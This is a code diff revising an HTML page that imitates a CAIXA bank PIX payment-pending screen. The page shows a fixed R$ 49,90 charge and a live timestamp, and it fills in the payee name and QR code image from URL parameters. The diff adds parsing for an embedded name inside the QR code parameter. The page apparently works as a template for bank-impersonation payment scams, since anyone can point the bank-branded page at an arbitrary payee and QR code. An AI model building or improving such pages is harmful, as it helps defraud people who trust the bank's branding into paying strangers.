@@ -27,11 +27,11 @@
         }
 
         .header {
-            background-image: url('header.png');
+            background-color: #005CA9;
             background-size: cover;
             background-repeat: no-repeat;
             color: white;
-            padding: 60px;
+            padding: 20px;
         }
 
         .value-date-container {
@@ -79,8 +79,12 @@
         }
 
         .status-alert img {
-            height: 45px;
-            margin-right: 19px;
+            height: 24px;
+            width: 24px;
+            margin-right: 10px;
+            background-color: red;
+            border-radius: 50%;
+            padding: 2px;
         }
 
         .status-text {
@@ -92,6 +96,12 @@
             font-weight: bold;
             color: #d9534f;
             margin-bottom: 5px;
+            display: block;
+        }
+
+        .status-text span {
+            font-size: 14px;
+            color: #666;
         }
 
         .receiver-info {
@@ -99,50 +109,63 @@
             background-color: #f7f7f7;
             border-radius: 4px;
             margin: 15px 20px 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
         .receiver-info h2 {
             font-size: 16px;
             color: #333;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-weight: bold;
         }
 
         .receiver-info label {
-            font-size: 16px;
+            font-size: 14px;
             color: #666;
-            font-weight: bold;
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
         }
 
-        .receiver-info p {
-            font-size: 18px;
-            color: #333;
-            margin: 5px 0px 10px 0px;
+        .pix-copy {
+            cursor: pointer;
+            color: #1178d3;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 10px auto;
+            display: block;
+        }
+
+        .caixa-logo {
+            color: white;
+            font-size: 24px;
             font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header"></div>
+        <div class="header">
+            <div class="caixa-logo">CAIXA</div>
+        </div>
         <div class="value-date-container">
             <div class="value-date">
                 <label>Valor</label>
                 <p>R$ 49,90</p>
             </div>
-            <div class="value-date" style="text-align: center;">
+            <div class="value-date">
                 <label>Data</label>
-                <p style="margin: 1px 0 px -4px 0px;"><span style="font-size: 16px;">18/10/2024</span><br><span style="font-size: 16px;">19:32:49</span></p>
+                <p id="datetime"></p>
             </div>
         </div>
         <div class="status-alert">
-            <img src="erro.png" alt="Erro">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-7v2h2v-2h-2zm0-8v6h2V7h-2z'/%3E%3C/svg%3E" alt="Alerta">
             <div class="status-text">
-                <strong style="font-size: 16px; color: red;">PIX Pendente!</strong><br>
-                Aguardando Pagamento...
+                <strong>PIX Pendente!</strong>
+                <span>Aguardando Pagamento...</span>
             </div>
         </div>
         <div class="receiver-info">
@@ -150,32 +173,35 @@
             <label>Nome</label>
             <p id="nome"></p>
             <label>Chave PIX</label>
-            <p id="pix">
-                <span onclick="navigator.clipboard.writeText(document.getElementById('pix').textContent); alert('PIX COPIA E COLA COPIADO!');" style="cursor: pointer;">Copiar Chave PIX</span>
-                <br>
-                <img id="qrcode" src="" alt="QR Code">
-            </p>
+            <div class="pix-copy" id="pix" onclick="copiarPix()">Copiar Chave PIX</div>
+            <img id="qrcode" src="" alt="QR Code">
         </div>
     </div>
     <script>
-        // Função para obter os parâmetros da URL
         function getQueryParams() {
-            var params = {};
-            var parser = document.createElement('a');
-            parser.href = window.location.href;
-            var query = parser.search.substring(1);
-            var vars = query.split('&');
-            for (var i = 0; i < vars.length; i++) {
-                var pair = vars[i].split('=');
-                params[pair[0]] = decodeURIComponent(pair[1]);
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            let params = {};
+            
+            // Trata o caso especial do qrcode com nome como parâmetro
+            const qrcodeParam = urlParams.get('qrcode');
+            if (qrcodeParam && qrcodeParam.includes('?nome=')) {
+                const [qrcodeUrl, nomeParam] = qrcodeParam.split('?nome=');
+                params.qrcode = qrcodeUrl;
+                params.nome = nomeParam;
+            } else {
+                // Processamento normal dos parâmetros
+                for (const [key, value] of urlParams) {
+                    params[key] = value;
+                }
             }
+            
             return params;
         }
 
-        // Função para atualizar a data e a hora
         function updateDateTime() {
-            var now = new Date();
-            var options = {
+            const now = new Date();
+            const options = {
                 day: '2-digit',
                 month: '2-digit',
                 year: 'numeric',
@@ -185,26 +211,30 @@
                 hour12: false,
                 timeZone: 'America/Sao_Paulo'
             };
-            var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', '');
-            var [date, time] = dateTimeString.split(' ');
-            document.querySelector('.value-date span:first-child').textContent = date.trim();
-            document.querySelector('.value-date span:last-child').textContent = time;
+            const dateTimeString = now.toLocaleString('pt-BR', options).replace(',', '');
+            document.getElementById('datetime').textContent = dateTimeString;
         }
 
-        // Configura os parâmetros da URL nos campos
-        window.onload = function () {
-            var queryParams = getQueryParams();
-            if (queryParams.nome) {
-                document.getElementById('nome').textContent = queryParams.nome;
+        function copiarPix() {
+            const pixValue = "Sua chave PIX aqui"; // Substitua pelo valor real da chave PIX
+            navigator.clipboard.writeText(pixValue)
+                .then(() => alert('Chave PIX copiada!'))
+                .catch(err => alert('Erro ao copiar: ' + err));
+        }
+
+        window.onload = function() {
+            const params = getQueryParams();
+            
+            if (params.nome) {
+                document.getElementById('nome').textContent = params.nome;
             }
-            if (queryParams.pix) {
-                document.getElementById('pix').textContent = queryParams.pix;
-                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
+            
+            if (params.qrcode) {
+                document.getElementById('qrcode').src = params.qrcode;
             }
-            if (queryParams.qrcode) {
-                document.getElementById('qrcode').src = queryParams.qrcode;
-            }
+            
             updateDateTime();
+            setInterval(updateDateTime, 1000);
         };
     </script>
 </body>
